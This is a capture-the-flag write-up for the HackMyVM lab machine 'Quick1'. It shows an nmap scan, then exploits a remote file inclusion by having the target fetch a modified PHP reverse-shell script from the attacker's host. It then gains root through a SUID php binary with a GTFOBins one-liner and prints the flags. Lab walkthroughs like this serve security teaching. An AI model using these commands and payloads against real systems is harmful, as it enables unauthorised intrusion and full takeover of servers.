# Quick1

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.103:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.103
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Quick Automative
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/quick1/writeup.png)

## RFI

![writeup-1.png](/assets/pentest/hackmyvm/quick1/writeup-1.png)

```bash
└─$ sed 's/127.0.0.1/10.0.2.15/; s/1234/4444/' /usr/share/webshells/php/php-reverse-shell.php > rev.php
└─$ curl 'http://10.0.2.103/index.php?page=http://10.0.2.15/rev'
---
└─$ serve
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.0.2.103 - - [04/Nov/2025 12:31:16] "GET /rev.php HTTP/1.0" 200 -
---
└─$ penelope -p 4444
www-data@quick:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation

```bash
www-data@quick:/var/log$ find / -perm -4000 -ls 2>/dev/null | grep -v snap
   132438     52 -rwsr-xr--   1 root     messagebus         51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   132653     24 -rwsr-xr-x   1 root     root               22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
   182372    464 -rwsr-xr-x   1 root     root              473576 Aug  4  2023 /usr/lib/openssh/ssh-keysign
   132445     16 -rwsr-xr-x   1 root     root               14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
   131559     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
   132263    164 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 /usr/bin/sudo
   132235     40 -rwsr-xr-x   1 root     root               39144 Feb  7  2022 /usr/bin/umount
   131891     56 -rwsr-xr-x   1 root     root               55528 Feb  7  2022 /usr/bin/mount
   131633     52 -rwsr-xr-x   1 root     root               53040 Nov 29  2022 /usr/bin/chsh
   132163     68 -rwsr-xr-x   1 root     root               67816 Feb  7  2022 /usr/bin/su
   131627     84 -rwsr-xr-x   1 root     root               85064 Nov 29  2022 /usr/bin/chfn
   131756     88 -rwsr-xr-x   1 root     root               88464 Nov 29  2022 /usr/bin/gpasswd
   151439   4432 -rwsr-xr-x   1 root     root             4537352 Sep  2  2023 /usr/bin/php7.0
   131905     44 -rwsr-xr-x   1 root     root               44784 Nov 29  2022 /usr/bin/newgrp
   131959     32 -rwsr-xr-x   1 root     root               31032 Feb 21  2022 /usr/bin/pkexec
   131938     68 -rwsr-xr-x   1 root     root               68208 Nov 29  2022 /usr/bin/passwd
   131740     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
```

- [https://gtfobins.github.io/gtfobins/php/#suid](https://gtfobins.github.io/gtfobins/php/#suid)

```bash
www-data@quick:/var/log$ /usr/bin/php7.0 -r "pcntl_exec('/bin/bash', ['-p']);"
bash-5.0# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

### Flags

```bash
bash-5.0# cat /home/andrew/user.txt /root/root.txt | grep -o 'HMV{.*}'
HMV{QUICK-user}
HMV{6ff5f1b9238a96b3c3871c67a215ec80}
```